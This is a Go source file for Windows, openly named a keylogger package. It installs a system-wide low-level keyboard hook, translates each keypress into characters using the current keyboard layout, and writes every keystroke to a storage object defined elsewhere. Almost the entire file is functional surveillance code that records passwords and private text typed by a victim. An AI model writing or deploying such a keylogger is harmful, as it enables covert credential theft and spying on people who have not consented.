////go:build windows

package keylogger

import (
	"syscall"
	"unsafe"
	"strconv"

	"github.com/kataras/golog"
)

func GetKeyboardLayout() string {
	user32dll := syscall.NewLazyDLL("user32.dll")
	getKeyboardLayout := user32dll.NewProc("GetKeyboardLayout")
	layout, _, _ := getKeyboardLayout.Call(0)
	langID := uint16(layout & 0xffff)
	langStr := strconv.Itoa(int(langID))
	return langStr
}

func StartKeylogger() error{

	go func() {
		user32 := syscall.NewLazyDLL("user32.dll")
		setWindowsHookEx := user32.NewProc("SetWindowsHookExW")
		unhookWindowsHookEx := user32.NewProc("UnhookWindowsHookEx")
		callNextHookEx := user32.NewProc("CallNextHookEx")
		getMessage := user32.NewProc("GetMessageW")

		// Define KBDLLHOOKSTRUCT as per Windows API
		type KBDLLHOOKSTRUCT struct {
			VkCode      uint32
			ScanCode    uint32
			Flags       uint32
			Time        uint32
			DwExtraInfo uintptr
		}
		golog.Debug("Starting keylogger")
		// Callback to process low-level keyboard events
		hookProc := syscall.NewCallback(func(nCode int, wParam uintptr, lParam uintptr) uintptr {
			// Only log for WM_KEYDOWN event (0x0100)
			if nCode == 0 && wParam == 0x100 { // HC_ACTION and WM_KEYDOWN
				kbd := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
				// Log the virtual key code (can be extended to translate the key)
				var kbState [256]byte
				user32dll := syscall.NewLazyDLL("user32.dll")
				getKeyboardState := user32dll.NewProc("GetKeyboardState")
				toUnicodeEx := user32dll.NewProc("ToUnicodeEx")
				getKeyboardLayout := user32dll.NewProc("GetKeyboardLayout")

				// Retrieve current keyboard state
				if ret, _, _ := getKeyboardState.Call(uintptr(unsafe.Pointer(&kbState[0]))); ret == 0 {
					// If failed, fallback to writing the virtual key code.
					KeyloggerStorage.Write("code:"+strconv.Itoa(int(kbd.VkCode)))
					return ret
				}

				// Prepare buffer for the translated character(s)
				var buf [16]uint16
				layout, _, _ := getKeyboardLayout.Call(0)
				result, _, _ := toUnicodeEx.Call(
					uintptr(kbd.VkCode),
					uintptr(kbd.ScanCode),
					uintptr(unsafe.Pointer(&kbState[0])),
					uintptr(unsafe.Pointer(&buf[0])),
					uintptr(len(buf)),
					0,
					layout,
				)

				if int(result) > 0 {
					key := syscall.UTF16ToString(buf[:result])
					KeyloggerStorage.Write(key)
				} else {
					KeyloggerStorage.Write("<"+strconv.Itoa(int(kbd.VkCode))+">")
				}
			}
			ret, _, _ := callNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
			return ret
		})

		// WH_KEYBOARD_LL value is 13
		const WH_KEYBOARD_LL = 13
		hHook, _, _ := setWindowsHookEx.Call(uintptr(WH_KEYBOARD_LL), hookProc, 0, 0)
		if hHook == 0 {
			return
		}
		defer unhookWindowsHookEx.Call(hHook)

		// Message loop to maintain the hook
		var msg struct {
			hwnd    uintptr
			message uint32
			wParam  uintptr
			lParam  uintptr
			time    uint32
			pt      struct {
				x, y int32
			}
		}
		for {
			ret, _, _ := getMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
			if int(ret) == 0 { // WM_QUIT received; exit loop
				break
			}
		}
	}()

	return nil
}